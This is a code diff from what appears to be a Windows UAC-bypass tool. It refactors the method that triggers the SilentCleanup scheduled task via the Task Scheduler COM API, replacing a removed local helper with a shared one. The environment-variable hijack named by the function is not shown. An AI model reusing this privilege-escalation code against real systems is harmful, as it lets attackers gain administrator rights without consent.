@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.67
 *
-*  DATE:        04 Feb 2025
+*  DATE:        11 Feb 2025
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -26,93 +26,6 @@
 *
 *******************************************************************************/
 #include "global.h"
-
-/*
-* ucmxStartTask
-*
-* Purpose:
-*
-* Run target task as schtasks does.
-*
-*/
-BOOLEAN ucmxStartTask()
-{
-    HRESULT hr_init, hr = E_FAIL;
-    ITaskService* pService = NULL;
-    ITaskFolder* pRootFolder = NULL;
-    IRegisteredTask* pTask = NULL;
-    IRunningTask* pRunningTask = NULL;
-    VARIANT var;
-
-    BSTR bstrTaskFolder = NULL;
-    BSTR bstrTask = NULL;
-
-    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-
-    do {
-
-        bstrTaskFolder = SysAllocString(L"\\Microsoft\\Windows\\DiskCleanup");
-        if (bstrTaskFolder == NULL)
-            break;
-
-        bstrTask = SysAllocString(L"SilentCleanup");
-        if (bstrTask == NULL)
-            break;
-
-        hr = CoCreateInstance(&CLSID_TaskScheduler,
-            NULL,
-            CLSCTX_INPROC_SERVER,
-            &IID_ITaskService,
-            (void**)&pService);
-
-        if (FAILED(hr))
-            break;
-
-        var.vt = VT_NULL;
-
-        hr = pService->lpVtbl->Connect(pService, var, var, var, var);
-        if (FAILED(hr))
-            break;
-
-        hr = pService->lpVtbl->GetFolder(pService, bstrTaskFolder, &pRootFolder);
-        if (FAILED(hr))
-            break;
-
-        hr = pRootFolder->lpVtbl->GetTask(pRootFolder, bstrTask, &pTask);
-        if (FAILED(hr))
-            break;
-
-        hr = pTask->lpVtbl->RunEx(pTask, var, TASK_RUN_IGNORE_CONSTRAINTS, 0, NULL, &pRunningTask);
-        if (FAILED(hr))
-            break;
-
-    } while (FALSE);
-
-    if (bstrTaskFolder)
-        SysFreeString(bstrTaskFolder);
-
-    if (bstrTask)
-        SysFreeString(bstrTask);
-
-    if (pRunningTask) {
-        pRunningTask->lpVtbl->Stop(pRunningTask);
-        pRunningTask->lpVtbl->Release(pRunningTask);
-    }
-
-    if (pTask)
-        pTask->lpVtbl->Release(pTask);
-
-    if (pRootFolder)
-        pRootFolder->lpVtbl->Release(pRootFolder);
-
-    if (pService)
-        pService->lpVtbl->Release(pService);
-
-    if (SUCCEEDED(hr_init))
-        CoUninitialize();
-
-    return SUCCEEDED(hr);
-}
 
 /*
 * ucmDiskCleanupEnvironmentVariable
@@ -159,7 +72,7 @@ NTSTATUS ucmDiskCleanupEnvironmentVariable(
         //
         // Run trigger task.
         //
-        if (ucmxStartTask())
+        if (supStartScheduledTask(L"\\Microsoft\\Windows\\DiskCleanup", L"SilentCleanup"))
             MethodResult = STATUS_SUCCESS;
 
         //
